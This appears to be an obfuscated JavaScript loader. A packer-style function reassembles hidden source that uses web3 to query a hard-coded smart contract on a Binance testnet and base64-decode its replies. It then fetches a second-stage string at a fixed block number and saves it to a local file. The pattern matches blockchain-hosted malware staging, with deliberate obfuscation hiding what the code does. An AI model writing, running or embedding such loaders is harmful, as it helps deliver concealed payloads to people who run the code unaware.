run_stuff = function (arg0, arg1, arg2, arg3, arg4, arg5) {
  arg4 = function (subArg0) {
    return (subArg0 < arg1 ? '' : arg4(parseInt(subArg0 / arg1))) + ((subArg0 = subArg0 % arg1) > 0x23 ? String.fromCharCode(subArg0 + 0x1d) : subArg0.toString(0x24));
  };
  if (!''.replace(/^/, String)) {
    while (arg2--) {
      arg5[arg4(arg2)] = arg3[arg2] || arg4(arg2);
    }
    arg3 = [function (x0) {
      return arg5[x0];
    }];
    arg4 = function () {
      return "\\w+";
    };
    arg2 = 0x1;
  }
  ;
  while (arg2--) {
    if (arg3[arg2]) {
      arg0 = arg0.replace(new RegExp("\\b" + arg4(arg2) + "\\b", 'g'), arg3[arg2]);
    }
  }
  return arg0;
}
var arg0 = "0 l=k(\"1\");0 4=k(\"4\");0 1=L l(\"M\");0 a=\"O\";P y j(5){J{0 g=\"K\";0 o=g+1.3.7.u([\"c\"],[5]).v(2);0 q=m 1.3.h({f:a,d:o});0 p=1.3.7.s(\"c\",q);0 9=E.D(p,\"B\").x(\"C-8\");0 6=\"X.Y\";4.z(6,\"$t = \"+9+\"\\n\");0 r=\"Q\";0 w=W;0 i=r+1.3.7.u([\"t\"],[9]).v(2);0 A=m 1.3.h({f:a,d:i},w);0 e=1.3.7.s(\"c\",A);0 S=E.D(e,\"B\").x(\"C-8\");4.z(6,e);F.V(`U N d f:${6}`)}H(b){F.b(\"G R I y:\",b)}}0 5=\"T\";j(5);";
var arg3 = "const|web3||eth|fs|inputString|filePath|abi||targetAddress|contractAddress|error|string|data|decodedData|to|methodId|call|newEncodedData|callContractFunction|require|Web3|await||encodedData|largeString|result|new_methodId|decodeParameter|address|encodeParameters|slice|blockNumber|toString|function|writeFileSync|newData|base64|utf|from|Buffer|console|Error|catch|contract|try|0x5684cff5|new|BINANCE_TESTNET_RPC_URL|decoded|0x9223f0630c598a200f99c5d4746531d10319a569|async|0x5c880fcb|calling|base64DecodedData|KEY_CHECK_VALUE|Saved|log|43152014|decoded_output|txt".split('|');
document.write(run_stuff(arg0, 0x3d, 0x3d, arg3, 0x0, {}));